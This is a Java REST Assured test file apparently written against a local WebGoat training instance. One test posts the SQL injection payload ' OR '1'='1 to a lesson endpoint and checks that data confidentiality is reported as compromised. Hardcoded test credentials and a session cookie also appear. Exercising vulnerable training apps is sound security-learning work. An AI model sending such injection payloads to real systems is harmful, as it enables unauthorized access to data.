package tests;

import static io.restassured.RestAssured.given;
import static org.hamcrest.Matchers.equalTo;

import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import static org.hamcrest.Matchers.containsString;

import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import io.restassured.response.Response;

public class APITest {
	
	
	private String sessionId;
	
	@BeforeClass
    public void setup() {
        RestAssured.baseURI = "http://localhost:8080";
    }


//    @Test
//    public void testStatusCode() {
//        // Set base URI for the API
//        RestAssured.baseURI = "http://localhost:8080";
//        
//        // Send a GET request to the API endpoint
//        given()
//            .when()
//            .get("/sample/hello.jsp")
//            .then()
//            // Verify that the response status code is 200
//            .assertThat()
//            .statusCode(200);
//    }
    
    

	@Test(priority = 1 , enabled = false)
	public void testLoginAndGetSessionId() {
	    Response response = given()
	            .contentType(ContentType.URLENC)
	            .formParam("username", "shivamkathayat")
	            .formParam("password", "1234567")
	            .when()
	            .post("/WebGoat/login")
	            .then()
	            // Allow following redirects
	            .statusCode(302)
	            .extract()
	            .response();
	    
	    // Check if the response is redirected
	    if (response.getStatusCode() == 302) {
	        // Extract the session ID from the redirected response headers
	        sessionId = response.getCookie("JSESSIONID");
	    } else {
	        // Extract the session ID from the response headers
	        sessionId = response.getCookie("JSESSIONID");
	    }
	}

	
	@Test(priority = 2)
	public void testSuccessfulSqlInjection() {
	    given()
	        .contentType(ContentType.URLENC)
	        .cookie("JSESSIONID", "GpZ745UPYQooQzPrS3ESrLUgC6VxFHOZP9")
	        .formParam("name", "a")
	        .formParam("auth_tan", "' OR '1'='1")
	    .when()
	        .post("/WebGoat/SqlInjection/attack8")
	    .then()
	        .log().all() // Log response details
	        .statusCode(200)
	        .body("lessonCompleted", equalTo(true))
	        .body("feedback", containsString("successfully compromised the confidentiality of data"));
	}

	@Test(priority = 3)
	public void testUnsuccessfulSqlInjection() {
	    given()
	        .contentType(ContentType.URLENC)
	        .cookie("JSESSIONID", "GpZ745UPYQooQzPrS3ESrLUgC6VxFHOZP9")
	        .formParam("name", "a")
	        .formParam("auth_tan", "12")
	    .when()
	        .post("/WebGoat/SqlInjection/attack8")
	    .then()
	        .log().all() // Log response details
	        .statusCode(200)
	        .body("lessonCompleted", equalTo(false))
	        .body("feedback", containsString("No employee found with matching last name"));
	}
    
    
    
}